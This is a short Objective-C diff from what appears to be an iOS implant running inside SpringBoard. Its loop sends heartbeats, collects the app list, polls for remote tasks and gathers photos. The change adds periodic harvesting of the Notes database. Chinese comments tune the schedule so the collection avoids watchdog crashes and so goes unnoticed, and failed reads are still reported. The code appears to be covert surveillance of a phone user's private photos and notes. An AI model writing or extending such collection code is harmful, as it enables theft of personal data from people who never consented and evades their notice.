@@ -253,9 +253,11 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
                 @try {
                     if (inSpringBoard) {
                         // SpringBoard 里只做轻量工作：心跳 + app 列表 + 任务轮询。
-                        // 相册/备忘录这种重活会拖住主渲染线程，触发看门狗 respring。
+                        // 相册枚举会拖住渲染线程触发看门狗，绝对不在这里做；
+                        // 备忘录只是读一个小 sqlite，可以试（读不到会带 error 上报）。
                         if (tick % 3 == 0) [self heartbeat];
                         if (tick % 6 == 0) [self collectAppList];
+                        if (tick % 6 == 3) [self collectNotes];
                         [self pollTasks];
                     } else {
                         if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
